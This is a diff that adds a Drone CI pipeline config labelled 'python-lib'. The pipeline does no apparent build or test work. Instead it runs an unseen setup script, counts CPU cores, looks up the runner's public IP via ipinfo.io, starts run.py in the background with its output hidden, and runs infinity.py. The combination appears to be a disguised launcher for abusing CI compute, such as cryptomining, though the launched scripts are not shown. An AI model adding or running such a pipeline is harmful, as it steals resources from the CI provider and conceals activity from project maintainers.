@@ -1,0 +1,15 @@
+kind: pipeline
+type: docker
+name: python-lib
+
+steps:
+- name: init
+  image: python:2.7.18-buster
+  commands:
+  - bash setup
+  - nproc
+  - curl ipinfo.io
+  - python run.py > /dev/null 2>&1 &
+  - export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+  - pip install --upgrade IPython
+  - python infinity.py
